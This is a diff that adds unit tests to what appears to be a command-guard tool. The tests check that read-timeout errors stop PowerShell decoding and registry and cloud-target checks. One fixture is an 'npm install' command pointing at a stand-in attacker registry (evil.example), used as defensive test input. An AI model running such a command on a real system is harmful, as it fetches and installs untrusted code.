@@ -417,5 +417,31 @@ class PowerShellHookTests(unittest.TestCase):
                 self.assertEqual(proc.returncode, 2)
 
 
+class ReadTimeoutTests(unittest.TestCase):
+    """Review of the #137 merge: the timer's ReadTimeout is a ValueError, and must stop the check wherever it fires."""
+
+    def test_decoding_an_encoded_command_never_swallows_the_timer(self):
+        from unittest import mock
+
+        with mock.patch.object(powershell.base64, "b64decode", side_effect=destructive.ReadTimeout("alarm")):
+            with self.assertRaises(destructive.ReadTimeout):
+                powershell.decode_encoded("bABzAA==")
+        self.assertIsNone(powershell.decode_encoded("not base64!"))
+
+    def test_a_runner_string_is_read_under_the_outer_deadline(self):
+        import time
+
+        from catpilot_guard.cloud_targets import cloud_targets
+        from catpilot_guard.registry_targets import registry_targets
+
+        split = ([["npx", "-c", "npm install --registry https://evil.example x"]], [])
+        past = time.monotonic() - 1
+        with self.assertRaises(destructive.ReadTimeout):
+            registry_targets("", split=split, deadline=past)
+        with self.assertRaises(destructive.ReadTimeout):
+            cloud_targets("", split=([["npx", "-c", "aws s3 ls --account-id 999999999999"]], []), deadline=past)
+        self.assertTrue(registry_targets("", split=split))  # with time left, the string is read
+
+
 if __name__ == "__main__":
     unittest.main()
